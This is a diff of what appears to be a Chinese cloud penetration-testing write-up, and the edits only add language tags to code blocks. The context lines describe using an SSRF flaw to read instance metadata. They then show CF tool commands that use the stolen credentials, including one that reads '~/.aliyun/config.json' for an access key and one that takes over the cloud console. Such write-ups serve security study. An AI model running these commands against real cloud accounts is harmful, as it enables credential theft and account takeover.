@@ -35,7 +35,7 @@ categories:
 
 ![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131931262.png) 通过查询该域名所属 IP，发现该站点位于云上，那么我们就可以利用这个 SSRF 漏洞去获取实例的元数据信息，但是这样每次获取数据都要手动发两个数据包就很麻烦，所以这里简单搞个脚本。
 
-```
+```python
   import sys
   import requests
   
@@ -66,7 +66,7 @@ categories:
 
 我们先把凭证配置到 CF 里，CF 下载地址：https://github.com/teamssix/cf/releases
 
-```
+```bash
   cf configure
 ```
 
@@ -74,7 +74,7 @@ categories:
 
 查看当前凭证的权限
 
-```
+```bash
   cf ls permissions
 ```
 
@@ -84,7 +84,7 @@ categories:
 
 这里先列出 OSS 资源看看
 
-```
+```bash
   cf oss ls
 ```
 
@@ -94,7 +94,7 @@ categories:
 
 查看一下存储桶里有哪些文件
 
-```
+```bash
   cf oss ls -b bucketName
 ```
 
@@ -102,7 +102,7 @@ categories:
 
 利用 CF 下载文件，如果想下载全部对象，则不指定 `-k`参数即可。
 
-```
+```bash
   cf oss get -b bucketName -k objectKey
 ```
 
@@ -124,7 +124,7 @@ categories:
 
 先用 CF 看一下有哪些 ECS 实例
 
-```
+```bash
   cf ecs ls
 ```
 
@@ -132,7 +132,7 @@ categories:
 
 使用 CF 一键获取临时访问凭证
 
-```
+```bash
   cf ecs exec -m
 ```
 
@@ -142,7 +142,7 @@ categories:
 
 于是通过临时访问凭证横向的这条路就断了，那就继续在实例上信息收集吧，看看能不能找到什么有价值的信息，最后发现有一台实例安装了 aliyun cli 工具，并且配置过 AK，那么这样一来我们就可以通过查看 aliyun cli 工具的配置文件获取到这个 AK。
 
-```
+```bash
  cf ecs exec -c "cat ~/.aliyun/config.json"
 ```
 
@@ -158,7 +158,7 @@ categories:
 
 使用 CF 一键接管控制台
 
-```
+```bash
  cf console
 ```
 
